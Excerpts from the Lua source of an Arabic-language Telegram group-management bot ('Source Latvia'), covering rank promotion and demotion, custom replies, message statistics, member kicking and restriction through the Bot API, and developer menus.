DevRio:set(Latvia.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)  
DevRio:sadd(Latvia..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
...
DevRio:srem(Latvia..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(Latvia.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'latviateam')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:srem(Latvia..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(Latvia.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'latviateam')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:srem(Latvia..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(Latvia.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'latviateam')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
end
...
if DevRio:sismember(Latvia.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrrio = DevRio:get(Latvia.."Comd:New:rt:Rio:"..text1[2]..msg.chat_id_)
if mrrio == "مميز" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'latviateam')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(Latvia..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:set(Latvia.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'latviateam')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(Latvia..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:set(Latvia.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'latviateam')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(Latvia..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:set(Latvia.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'latviateam')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevRio:srem(Latvia..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:del(Latvia.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'latviateam')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:srem(Latvia..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:del(Latvia.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'latviateam')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:srem(Latvia..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:del(Latvia.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'latviateam')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevRio:incr(Latvia..'Rio:UsersMsgs'..Latvia..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:incr(Latvia..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:incr(Latvia..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevRio:sismember(Latvia.."Rio:Users",msg.chat_id_) then
DevRio:sadd(Latvia.."Rio:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
...
if text == '↫ السورس ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بتحديث  سورس لاتفيا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تحديث السورس ᥀','↫ تحديث ᥀'},
{'↫ السيرفر ᥀'},
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب أحصائيات  سورس لاتفيا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫  الاحصائيات ᥀'},
{'↫ المشتركين ᥀','↫ المجموعات ᥀'},
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب المطورين لسورس لاتفيا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب التفعيل والتعطيل لسورس لاتفيا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالاذاعه لسورس لاتفيا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ اذاعه بالتثبيت ᥀'},
{'↫ اذاعه خاص ᥀','↫ اذاعه عام ᥀'},
...
if text == '↫ العام ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالعام لسورس لاتفيا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بردود الخاص لسورس لاتفيا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالاشتراك الاجباري لسورس لاتفيا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بالاوامر الخدميه الخاصه بسورس لاتفيا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر التسليه الخاصه بسورس لاتفيا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ غنيلي ᥀','↫ اغنيه ᥀'},
{'↫ ميمز ᥀','↫ ريمكس ᥀'},
{'↫ صوره ᥀','↫ متحركه ᥀'},
...
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر البوتات الخاصه بسورس لاتفيا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر النسب الخاصه بسورس لاتفيا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if text == '↫ العاب ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بألعاب سورس لاتفيا فقط اضغط على اللعبه الذي تريد لعبها'
local key = {
...
if not DevRio:get(Latvia..'Rio:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
tdcli_function({ID="GetUser",user_id_=Latvia},function(arg,d) 
local inline = {
{{text="᥀ المطور .",url="t.me/"..(dp.username_ or "latviateam")}},
{{text="᥀ السورس .",url="https://t.me/latviateam"},{text="᥀ لتنصيب بوت .",url="https://t.me/opmni"}},{{text="᥀ اضفني في مجموعتك .",url="t.me/"..d.username_.."?startgroup=botstart"}}
}
local start = DevRio:get(Latvia.."Rio:Start:Bot")
if start then 
Start_Source = start
else
...
DevRio:setex(Latvia..'Rio:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source Latvia     --
if not SecondSudo(msg) and not DevRio:sismember(Latvia..'Rio:Ban:Pv',msg.sender_user_id_) and not DevRio:get(Latvia..'Rio:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_Rio(msg.sender_user_id_, msg.id_, 1, '᥀︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "latviateam")..')', 1, 'md') 
...
DevRio:sadd(Latvia..'Rio:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '᥀︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n᥀︙تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevRio:srem(Latvia..'Rio:Ban:Pv',data.id_)  
return false  
end 
...
--     Source Latvia     --
if text and DevRio:get(Latvia..'Rio:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevRio:del(Latvia..'Rio:Start:Bots'..msg.sender_user_id_) 
return false
end
DevRio:set(Latvia.."Rio:Start:Bot",text)  
...
DevRio:set(Latvia..'Rio:Start:Bots'..msg.sender_user_id_,true) 
...
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل التواصل بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Texting:Pv') 
end
if text == 'تعطيل التواصل' and ChCheck(msg) or text == '↫ تعطيل التواصل ᥀' and ChCheck(msg) then  
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل التواصل بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Texting:Pv',true) 
end
if Sudo(msg) then
...
DevRio:del(Latvia.."Rio:Lock:AutoFile")
end
...
DevRio:set(Latvia.."Rio:Lock:AutoFile",true) 
end
end
end
--     Source Latvia     --
...
local LatviaTeam = {'- Nothing stops him who wants you .','make them wish they had you !.','Maybe a magical girl','٫ 𝖡𝖾 𝗌𝗂𝗆𝗉𝗅𝖾 𝖺𝗇𝖽 𝖽𝗂𝖿𝖿𝖾𝗋𝖾𝗇𝗍','. 𝖬𝖺𝗄𝖾 𝖽𝗋𝖾𝖺𝗆𝗌 𝖿𝗋𝗈𝗆 𝗒𝗈𝗎𝗋 𝗋𝖾𝖿𝗋𝖺𝖼𝗍𝗂𝗈𝗇𝗌 . .',':Life is lying .','𝖨 𝗐𝗂𝗅𝗅 𝖺𝗅𝗐𝖺𝗒𝗌 𝗅𝗈𝗏𝖾 𝗒𝗈𝗎 𝗇𝖾𝗏𝖾𝗋 𝖿𝗈𝗋𝗀𝖾𝗍'}  
Dev_Rio(msg.chat_id_, msg.id_, 1, ''..LatviaTeam[math.random(#LatviaTeam)]..'' , 1, 'md')  
return false
end
--     Source Latvia     --
...
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or latviateam}}}
...
local my_ph = DevRio:get(Latvia.."Rio:Photo:Profile"..msg.chat_id_)
if not my_ph then
...
if not DevRio:get(Latvia..'Rio:Lock:Gamesinline'..msg.chat_id_) then
Text =[[
...
DevRio:incr(Latvia..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:set(Latvia.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevRio:get(Latvia.."Rio:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
...
DevRio:sadd(Latvia..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
...
DevRio:srem(Latvia.."Rio:Groups", msg.chat_id_) 
...
if DevRio:get(Latvia..'Rio:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevRio:incr(Latvia..'Rio:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevRio:incr(Latvia..'Rio:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     Source Latvia     --
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not DevRio:get(Latvia..'Rio:Lock:FreeBot'..Latvia) then
if ChatType == 'pv' then
...
DevRio:sadd(Latvia..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevRio:srem(Latvia..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevRio:sadd(Latvia..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
...
DevRio:sadd(Latvia.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevRio:sadd(Latvia.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevRio:srem(Latvia.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevRio:srem(Latvia.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevRio:sismember(Latvia..'Rio:Groups',msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevRio:get(Latvia..'Rio:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عدد اعضاء المجموعه اقل من ↫ *'..(DevRio:get(Latvia..'Rio:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تفعيل المجموعه "..dp.title_)  
DevRio:sadd(Latvia.."Rio:Groups",msg.chat_id_)
DevRio:sadd(Latvia..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
...
DevRio:set(Latvia.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
...
DevRio:set(Latvia..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source Latvia     --
local ReFalse = tostring(msg.chat_id_)
if not DevRio:sismember(Latvia.."Rio:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
...
if DevRio:get(Latvia..'Rio:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
DevRio:sadd(Latvia..'Rio:Tkeed:'..msg.chat_id_, dp.id_)
...
if DevRio:get(Latvia.."Rio:Lock:Join"..msg.chat_id_) then
...
if not Bot(msg) then 
local filter = DevRio:smembers(Latvia.."Rio:FilterPhoto"..msg.chat_id_)
...
if not Bot(msg) then 
local filter = DevRio:smembers(Latvia.."Rio:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
...
if not Bot(msg) then 
local filter = DevRio:smembers(Latvia.."Rio:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
...
local DelGpRedRedods = DevRio:get(Latvia..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
local GetGpTexts = DevRio:get(Latvia..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedods == 'DelGpRedRedods' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الرد ↫ '..msg.content_.text_..' للكلمه ↫ '..GetGpTexts..' تم حذفها',  1, "html")
DevRio:del(Latvia..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:srem(Latvia..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevRio:get(Latvia..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRedod' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevRio:del(Latvia..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Latvia..'Rio:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
DevRio:srem(Latvia..'Rio:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevRio:get(Latvia..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRed' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevRio:del(Latvia..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Latvia..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Latvia..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Latvia..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Latvia..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Latvia..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Latvia..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Latvia..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Latvia..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:srem(Latvia..'Rio:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevRio:get(Latvia.."Rio:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevRio:del(Latvia.."Rio:Add:AllRed"..msg.sender_user_id_)
DevRio:del(Latvia.."Rio:Gif:AllRed"..msg.content_.text_)
DevRio:del(Latvia.."Rio:Voice:AllRed"..msg.content_.text_)
DevRio:del(Latvia.."Rio:Audio:AllRed"..msg.content_.text_)
DevRio:del(Latvia.."Rio:Photo:AllRed"..msg.content_.text_)
DevRio:del(Latvia.."Rio:Stecker:AllRed"..msg.content_.text_)
DevRio:del(Latvia.."Rio:Video:AllRed"..msg.content_.text_)
DevRio:del(Latvia.."Rio:File:AllRed"..msg.content_.text_)
DevRio:del(Latvia.."Rio:Text:AllRed"..msg.content_.text_)
DevRio:del(Latvia.."Rio:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     Source Latvia     --
if text and text:match("^(.*)$") then
local SaveGpRedod = DevRio:get(Latvia..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRedod == 'SaveGpRedod' then
local GetGpTexts = DevRio:get(Latvia..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevRio:smembers(Latvia..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙᥀︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevRio:del(Latvia..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Latvia..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_)
DevRio:del(Latvia..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
DevRio:srem(Latvia..'Rio:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevRio:sadd(Latvia..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
if #List == 4 then 
...
if text and not DevRio:get(Latvia..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
if DevRio:sismember(Latvia..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
local LatviaTeam =  DevRio:smembers(Latvia..'Rio:Text:GpTexts'..text..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '['..LatviaTeam[math.random(#LatviaTeam)]..']' , 1, 'md')  
end
end
--     Source Latvia     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevRio:get(Latvia..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevRio:get(Latvia..'DelManagerRep'..msg.chat_id_)
DevRio:srem(Latvia..'Rio:Manager:GpRed'..msg.chat_id_,DelManagerRep)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ الرد', 1, 'md')
DevRio:del(Latvia..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Latvia..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Latvia..'DelManagerRep'..msg.chat_id_)
return false
end
DevRio:del(Latvia..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
local SaveGpRed = DevRio:get(Latvia..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
if msg.content_.video_ then DevRio:set(Latvia..'Rio:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevRio:set(Latvia..'Rio:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevRio:set(Latvia..'Rio:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevRio:set(Latvia..'Rio:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevRio:set(Latvia..'Rio:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
end
...
DevRio:set(Latvia..'Rio:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
end
if msg.content_.animation_ then DevRio:set(Latvia..'Rio:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevRio:set(Latvia..'Rio:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
end 
...
if msg.content_.text_ and not DevRio:get(Latvia..'Rio:Lock:GpRed'..msg.chat_id_) then 
if DevRio:get(Latvia..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Latvia..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(Latvia..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Latvia..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(Latvia..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Latvia..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(Latvia..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Latvia..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(Latvia..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Latvia..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(Latvia..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Latvia..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(Latvia..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Latvia..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
end
if DevRio:get(Latvia..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
function LatviaTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevRio:get(Latvia..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(Latvia..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevRio:get(Latvia..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_)
...
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevRio:get(Latvia.."Rio:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevRio:get(Latvia..'DelSudoRep')
DevRio:del(Latvia.."Rio:Sudo:AllRed",DelSudoRep)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ الرد', 1, 'md')
DevRio:del(Latvia.."Rio:Add:AllText"..msg.sender_user_id_)
DevRio:del(Latvia.."Rio:Add:AllRed"..msg.sender_user_id_)
DevRio:del(Latvia.."DelSudoRep")
return false
end
DevRio:del(Latvia.."Rio:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevRio:get(Latvia.."Rio:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevRio:set(Latvia.."Rio:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevRio:set(Latvia.."Rio:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevRio:set(Latvia.."Rio:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevRio:set(Latvia.."Rio:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevRio:set(Latvia.."Rio:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
...
DevRio:set(Latvia.."Rio:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevRio:set(Latvia.."Rio:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
